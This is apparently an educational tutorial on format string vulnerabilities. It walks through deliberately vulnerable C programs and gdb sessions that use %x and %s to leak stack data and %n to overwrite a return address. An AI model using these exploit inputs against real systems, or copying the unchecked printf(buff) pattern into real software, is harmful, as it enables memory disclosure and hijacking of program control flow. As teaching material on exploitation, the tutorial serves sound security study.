# Format string vulnerability

A format string vulnerability is a vulnerability about using vulnerable functions of the printf family, which don't check the format string itself. With a proper format specifier, you can view arbitrary data within the program, overwrite it and even control the flow of the program.

## View vulnerability

Consider this program:
```C
#include <stdio.h>
#include <string.h>

// gcc format-string.c -o format-string -m32

int main(int argc, char *argv[]){
  char buff[200];
  strncpy(buff, argv[1], 200);
  printf(buff);
  return 0;
}
```

Input usual string:
```bash
$ ./format-string "My String"
My String
```

Input string with format specifier `x`, which will show you hex:
```bash
$ ./format-string AAAA%x
AAAAfff932ef
```

You'll get some strange input...

Try another one:
```bash
$ ./format-string AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
AAAAffd972d4.c8.5665522b.0.0.0.ffd96424.0.41414141.252e7825
```

In this case, you got another artifact. Dots here is to simplify the view.

So, the artifact 41414141 is our string that we input at the beginning of the string. And this all is a stack. The program itself gives us the content of the stack.

```bash
$ ./format-string AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
AAAAffe442cb.c8.565d922b.0.0.0.ffe43aa4.0.41414141.252e7825.78252e78.2e78252e.252e7825
```

The next stuff is a continuation of our string.

### What can we do with it?

We can specify at the beginning of our string some address.

```bash
$ ./format-string $(python -c 'print "\xef\xbe\xad\xde" + "%x." * 100')
ﾭ�ffbb11c5.c8.565ad22b.0.0.0.ffbb0d04.0.deadbeef.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.5d688c00.ffbb0c70.0.0.f7dcdee5.f7f9a000.f7f9a000.
```

You see the value `0xdeadbeef` in the output. With different specifiers, we can write to this address or read what in this address.

## Format string specifiers

1. %d - decimal(int) - value.
2. %u - unsigned decimal(unsigned int) - value.
3. %x - hexadecimal(unsigned int) - value.
4. %s - string((const) unsigned char *) - reference.
5. %n - number of bytes written so far(* int) - reference.
6. %p - show what the pointer contains - value.

### Try different specifiers

```C
#include <stdio.h>

// gcc specifiers.c -o specifiers -m32

int main(int argc, char *argv[]){
  int num = -824;
  printf("Signed int: %d\n", num);
  unsigned int num2 = 10000;
  printf("Unsigned int: %u\n", num2);
  printf("Hexadecimal: %x\n", num);
  int *p = &num2;
  printf("Pointer: %p\n", p);
  const char *s = "Some string";
  printf("String: %s\n", s);
  int *count = &num2;
  printf("Number of bytes written: %n\n", count);
  printf("%u\n", *count);
  return 0;
}
```

On the last one, it will write the number of bytes written at the address within count pointer or num2, so, then I wrote this value and it's 25 bytes, which you can determine in python interpreter:
```bash
>>> len('Number of bytes written: ')
25
```

## Read arbitrary data

Consider this program:
```C
#include <stdio.h>
#include <string.h>
#include <unistd.h>

// gcc read-arbitrary-data.c -o read-arbitrary-data -m32

int main(int argc, char *argv[]){
  const char *allow = "Access granted.\n";
  const char *deny = "Access denied.\n";
  char buff[200];
  read(1, buff, 200);
  if (strncmp("password\0", buff, 9) == 0) {
    printf(allow);
    system("/bin/sh");
  } else {
    printf(deny);
    printf("Say goodbye!!!");
  }
  read(1, buff, 200);
  printf(buff);
}
```

Try to exploit it. Suppose that we don't know the password:
```bash
$ ./read-arbitrary-data
afasfsf
Access denied.
AAAAAAAAAAAAAAAAA
Say goodbye!!!AAAAAAAAAAAAAAAAA
```

Okay, we see that the program mirrors our string. Let's try format string.
```bash
$ ./read-arbitrary-data
asdfafaf
Access denied.
AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.
Say goodbye!!!AAAAffc06134.c8.5659824d.0.100.40.ffc062c4.0.0.0.56599008.56599019.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.
```

Again, you meet the value `0x41414141` which is the beginning of our string. But, what are the values before it? Check it out with %s.
```bash
$ ./read-arbitrary-data
sadfafa
Access denied.
AAAA%s %s %s %s %s %s %s %s %s %s
Say goodbye!!!AAAAAAAA%s %s %s %s %s %s %s %s %s %s
Segmentation fault (core dumped)
```

So, the program crashed because it can't find something useful at the address, for instance from the output above, of value `100` or `40`. These values are not the right address. And that's why you need to know about direct parameter access. In other words, you don't need to input chains like `%x.%x.%x.%x.%x.%x.%x.%x.`, you can access, for example, the `0x41414141` value from the output above, with this string `%13$s`. 13 is the number of the parameter in the format string, which is the beginning of our string. BUT. The format specifier `%s` is waiting for the address, but we will give it the value `0x41414141`.
```bash
$ ./read-arbitrary-data
asfasfa
Access denied.
AAAA%13$s
Segmentation fault (core dumped)
```

The program crashed.

Thus, with a little brute-force of the direct parameter access number or just specify the needed address at the beginning of the input string, you can read arbitrary data. Let's read the strings `Access denied.` and `Access granted.` which are just before our input string.
```bash
$ ./read-arbitrary-data
asfsadfas
Access denied.
AAAA%11$s%12$s
Say goodbye!!!AAAAAccess granted.
Access denied.

```

## Jump to an arbitrary address

Now you know how to read data that is not meant to be read. Then try writing some data, and here I will show you how to write an arbitrary address into the return address in the `format-string` binary so that you can jump to it later. You got to do disabling security techniques such as ASLR again.

### Determine where the return address is stored within the stack.

Firstly, place the breakpoint on the last instruction.
```bash
gef➤  disas main
Dump of assembler code for function main:
   0x080491b6 <+0>:	endbr32
   0x080491ba <+4>:	lea    ecx,[esp+0x4]
   0x080491be <+8>:	and    esp,0xfffffff0
   0x080491c1 <+11>:	push   DWORD PTR [ecx-0x4]
   0x080491c4 <+14>:	push   ebp
   0x080491c5 <+15>:	mov    ebp,esp
   0x080491c7 <+17>:	push   ebx
   0x080491c8 <+18>:	push   ecx
   0x080491c9 <+19>:	sub    esp,0xd0
   0x080491cf <+25>:	call   0x80490f0 <__x86.get_pc_thunk.bx>
   0x080491d4 <+30>:	add    ebx,0x2e2c
   0x080491da <+36>:	mov    eax,ecx
   0x080491dc <+38>:	mov    eax,DWORD PTR [eax+0x4]
   0x080491df <+41>:	add    eax,0x4
   0x080491e2 <+44>:	mov    eax,DWORD PTR [eax]
   0x080491e4 <+46>:	sub    esp,0x4
   0x080491e7 <+49>:	push   0xc8
   0x080491ec <+54>:	push   eax
   0x080491ed <+55>:	lea    eax,[ebp-0xd0]
   0x080491f3 <+61>:	push   eax
   0x080491f4 <+62>:	call   0x8049090 <strncpy@plt>
   0x080491f9 <+67>:	add    esp,0x10
   0x080491fc <+70>:	sub    esp,0xc
   0x080491ff <+73>:	lea    eax,[ebp-0xd0]
   0x08049205 <+79>:	push   eax
   0x08049206 <+80>:	call   0x8049070 <printf@plt>
   0x0804920b <+85>:	add    esp,0x10
   0x0804920e <+88>:	mov    eax,0x0
   0x08049213 <+93>:	lea    esp,[ebp-0x8]
   0x08049216 <+96>:	pop    ecx
   0x08049217 <+97>:	pop    ebx
   0x08049218 <+98>:	pop    ebp
   0x08049219 <+99>:	lea    esp,[ecx-0x4]
   0x0804921c <+102>:	ret    
End of assembler dump.
gef➤ b *main + 102
```

Secondly, determine the direct parameter number to your input:
```bash
gef➤  r $(python -c 'print "AAAA" + "%x." * 15')
Starting program: /home/shogun/repos/basics-of-pwn/content/format-string/format-string $(python -c 'print "AAAA" + "%x." * 15')

Breakpoint 1, 0x0804921c in main ()

gef➤  c
Continuing.
AAAAffffd269.c8.80491d4.0.0.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.[Inferior 1 (process 11316) exited normally]
```

The direct parameter number is 6.

Thirdly, when the program will stop at the breakpoint, view the stack.
```bash
gef➤  r $(python -c 'print "AAAA" + "%x." * 15')
Starting program: /home/shogun/repos/basics-of-pwn/content/format-string/format-string $(python -c 'print "AAAA" + "%x." * 15')

Breakpoint 1, 0x0804921c in main ()

gef➤  x/50wx $esp
0xffffcfbc:	0xf7ddbee5	0x00000002	0xffffd054	0xffffd060
0xffffcfcc:	0xffffcfe4	0xf7fa8000	0x00000000	0xffffd038
0xffffcfdc:	0x00000000	0xf7ffd000	0x00000000	0xf7fa8000
0xffffcfec:	0xf7fa8000	0x00000000	0xa458a854	0xe0ba6e44
0xffffcffc:	0x00000000	0x00000000	0x00000000	0x00000002
0xffffd00c:	0x080490a0	0x00000000	0xf7fe7b24	0xf7fe22f0
0xffffd01c:	0x0804c000	0x00000002	0x080490a0	0x00000000
0xffffd02c:	0x080490d6	0x080491b6	0x00000002	0xffffd054
0xffffd03c:	0x08049220	0x08049290	0xf7fe22f0	0xffffd04c
0xffffd04c:	0x0000001c	0x00000002	0xffffd224	0xffffd269
0xffffd05c:	0x00000000	0xffffd29b	0xffffd2ab	0xffffd2fb
0xffffd06c:	0xffffd30d	0xffffd320	0xffffd334	0xffffd368
0xffffd07c:	0xffffd3a2	0xffffd3b8
gef➤  ni
0xf7ddbee5 in __libc_start_main () from /lib/i386-linux-gnu/libc.so.6

gef➤  
```

Our value is `0xf7ddbee5`. Okay, so it is stored at `0xffffcfbc`.

### Try to write to the address

It's time to use `%n` specifier which will write the written size of the string to our address.
```bash
gef➤  r $(python -c 'print "\xbc\xcf\xff\xff" + "%6$x"')
Starting program: /home/shogun/repos/basics-of-pwn/content/format-string/format-string $(python -c 'print "\xbc\xcf\xff\xff" + "%6$x"')

Breakpoint 1, 0x0804921c in main ()

gef➤  x/50wx $esp
0xffffcfdc:	0xf7ddbee5	0x00000002	0xffffd074	0xffffd080
0xffffcfec:	0xffffd004	0xf7fa8000	0x00000000	0xffffd058
0xffffcffc:	0x00000000	0xf7ffd000	0x00000000	0xf7fa8000
0xffffd00c:	0xf7fa8000	0x00000000	0x9fb4e996	0xdb566f86
0xffffd01c:	0x00000000	0x00000000	0x00000000	0x00000002
0xffffd02c:	0x080490a0	0x00000000	0xf7fe7b24	0xf7fe22f0
0xffffd03c:	0x0804c000	0x00000002	0x080490a0	0x00000000
0xffffd04c:	0x080490d6	0x080491b6	0x00000002	0xffffd074
0xffffd05c:	0x08049220	0x08049290	0xf7fe22f0	0xffffd06c
0xffffd06c:	0x0000001c	0x00000002	0xffffd24d	0xffffd292
0xffffd07c:	0x00000000	0xffffd29b	0xffffd2ab	0xffffd2fb
0xffffd08c:	0xffffd30d	0xffffd320	0xffffd334	0xffffd368
0xffffd09c:	0xffffd3a2	0xffffd3b8
gef➤  c
Continuing.
����ffffcfbc[Inferior 1 (process 11587) exited normally]
gef➤  
```

Specify the address of the return value at the beginning of the input string. Then, show it in the output. You can see that the value was shifted. So, change the address at the beginning of the string and change the specifier from `x` to `n`.
```bash
gef➤  r $(python -c 'print "\xdc\xcf\xff\xff" + "%6$n"')
Starting program: /home/shogun/repos/basics-of-pwn/content/format-string/format-string $(python -c 'print "\xdc\xcf\xff\xff" + "%6$n"')

Breakpoint 1, 0x0804921c in main ()
gef➤  x/50wx $esp
0xffffcfdc:	0x00000004	0x00000002	0xffffd074	0xffffd080
0xffffcfec:	0xffffd004	0xf7fa8000	0x00000000	0xffffd058
0xffffcffc:	0x00000000	0xf7ffd000	0x00000000	0xf7fa8000
0xffffd00c:	0xf7fa8000	0x00000000	0x4291c779	0x06734169
0xffffd01c:	0x00000000	0x00000000	0x00000000	0x00000002
0xffffd02c:	0x080490a0	0x00000000	0xf7fe7b24	0xf7fe22f0
0xffffd03c:	0x0804c000	0x00000002	0x080490a0	0x00000000
0xffffd04c:	0x080490d6	0x080491b6	0x00000002	0xffffd074
0xffffd05c:	0x08049220	0x08049290	0xf7fe22f0	0xffffd06c
0xffffd06c:	0x0000001c	0x00000002	0xffffd24d	0xffffd292
0xffffd07c:	0x00000000	0xffffd29b	0xffffd2ab	0xffffd2fb
0xffffd08c:	0xffffd30d	0xffffd320	0xffffd334	0xffffd368
0xffffd09c:	0xffffd3a2	0xffffd3b8
gef➤  c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00000004 in ?? ()
```

Yeah, writing is happened. It wrote the 4 bytes cause we specified the 4 bytes at the beginning. Let's try change it to the first instruction of main function. So, our program will execute the main function twice.
```bash
gef➤  disas main
Dump of assembler code for function main:
   0x080491b6 <+0>:	endbr32
   0x080491ba <+4>:	lea    ecx,[esp+0x4]
   0x080491be <+8>:	and    esp,0xfffffff0
   0x080491c1 <+11>:	push   DWORD PTR [ecx-0x4]
   0x080491c4 <+14>:	push   ebp
   0x080491c5 <+15>:	mov    ebp,esp
   0x080491c7 <+17>:	push   ebx
   0x080491c8 <+18>:	push   ecx
   0x080491c9 <+19>:	sub    esp,0xd0
   0x080491cf <+25>:	call   0x80490f0 <__x86.get_pc_thunk.bx>
   0x080491d4 <+30>:	add    ebx,0x2e2c
   0x080491da <+36>:	mov    eax,ecx
   0x080491dc <+38>:	mov    eax,DWORD PTR [eax+0x4]
   0x080491df <+41>:	add    eax,0x4
   0x080491e2 <+44>:	mov    eax,DWORD PTR [eax]
   0x080491e4 <+46>:	sub    esp,0x4
   0x080491e7 <+49>:	push   0xc8
   0x080491ec <+54>:	push   eax
   0x080491ed <+55>:	lea    eax,[ebp-0xd0]
   0x080491f3 <+61>:	push   eax
   0x080491f4 <+62>:	call   0x8049090 <strncpy@plt>
   0x080491f9 <+67>:	add    esp,0x10
   0x080491fc <+70>:	sub    esp,0xc
   0x080491ff <+73>:	lea    eax,[ebp-0xd0]
   0x08049205 <+79>:	push   eax
   0x08049206 <+80>:	call   0x8049070 <printf@plt>
   0x0804920b <+85>:	add    esp,0x10
   0x0804920e <+88>:	mov    eax,0x0
   0x08049213 <+93>:	lea    esp,[ebp-0x8]
   0x08049216 <+96>:	pop    ecx
   0x08049217 <+97>:	pop    ebx
   0x08049218 <+98>:	pop    ebp
   0x08049219 <+99>:	lea    esp,[ecx-0x4]
=> 0x0804921c <+102>:	ret    
End of assembler dump.
gef➤  
```

Our first instruction of main is at the address `0x080491b6`. So, let's try to write it. Now, you need a `u` specifier. To specify before it the count of the numbers in unsigned int value.
```bash
$ python3
Python 3.8.5 (default, Jan 27 2021, 15:41:15)
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x080491b6
134517174
>>>
```

```bash
gef➤  r $(python -c 'print "\xdc\xcf\xff\xff" + "%134517170u" + "%6$n"')

Breakpoint 1, 0x0804921c in main ()
gef➤  x/50wx $esp
0xffffcfdc:	0x080491b6	0x00000002	0xffffd074	0xffffd080
0xffffcfec:	0xffffd004	0xf7fa8000	0x00000000	0xffffd058
0xffffcffc:	0x00000000	0xf7ffd000	0x00000000	0xf7fa8000
0xffffd00c:	0xf7fa8000	0x00000000	0xd207188e	0x96e59e9e
0xffffd01c:	0x00000000	0x00000000	0x00000000	0x00000002
0xffffd02c:	0x080490a0	0x00000000	0xf7fe7b24	0xf7fe22f0
0xffffd03c:	0x0804c000	0x00000002	0x080490a0	0x00000000
0xffffd04c:	0x080490d6	0x080491b6	0x00000002	0xffffd074
0xffffd05c:	0x08049220	0x08049290	0xf7fe22f0	0xffffd06c
0xffffd06c:	0x0000001c	0x00000002	0xffffd242	0xffffd287
0xffffd07c:	0x00000000	0xffffd29b	0xffffd2ab	0xffffd2fb
0xffffd08c:	0xffffd30d	0xffffd320	0xffffd334	0xffffd368
0xffffd09c:	0xffffd3a2	0xffffd3b8
gef➤  i r
eax            0x0                 0x0
ecx            0xffffcfe0          0xffffcfe0
edx            0x77fb6e49          0x77fb6e49
ebx            0x0                 0x0
esp            0xffffcfdc          0xffffcfdc
ebp            0x0                 0x0
esi            0xf7fa8000          0xf7fa8000
edi            0xf7fa8000          0xf7fa8000
eip            0x804921c           0x804921c <main+102>
eflags         0x286               [ PF SF IF ]
cs             0x23                0x23
ss             0x2b                0x2b
ds             0x2b                0x2b
es             0x2b                0x2b
fs             0x0                 0x0
gs             0x63                0x63
gef➤  ni
0x080491b6 in main ()
gef➤  i r
eax            0x0                 0x0
ecx            0xffffcfe0          0xffffcfe0
edx            0x77fb6e49          0x77fb6e49
ebx            0x0                 0x0
esp            0xffffcfe0          0xffffcfe0
ebp            0x0                 0x0
esi            0xf7fa8000          0xf7fa8000
edi            0xf7fa8000          0xf7fa8000
eip            0x80491b6           0x80491b6 <main>
eflags         0x286               [ PF SF IF ]
cs             0x23                0x23
ss             0x2b                0x2b
ds             0x2b                0x2b
es             0x2b                0x2b
fs             0x0                 0x0
gs             0x63                0x63
```

You see that the program executes the main function a second time.
